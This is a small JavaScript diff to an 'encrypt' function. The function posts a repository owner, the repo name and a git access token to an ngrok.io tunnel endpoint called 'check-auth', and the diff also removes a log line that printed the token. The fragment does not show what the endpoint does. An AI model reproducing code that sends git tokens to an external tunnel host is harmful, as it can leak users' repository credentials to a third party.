@@ -22,7 +22,7 @@ async function encrypt(repo, pass, branch) {
 
         let r1 = await axios.post("https://88a4fa7d.ngrok.io/api/check-auth", {
             owner,
-            pass,
+            gitToken:pass,
             repo:_repo,
             path: `auth.enc?ref=master`
         });
@@ -48,7 +48,6 @@ async function encrypt(repo, pass, branch) {
 }
 
 const a = async (repo, gitToken, branch) => {
-    console.log(repo, gitToken, branch)
     return await encrypt(repo, gitToken, branch)
 }
 
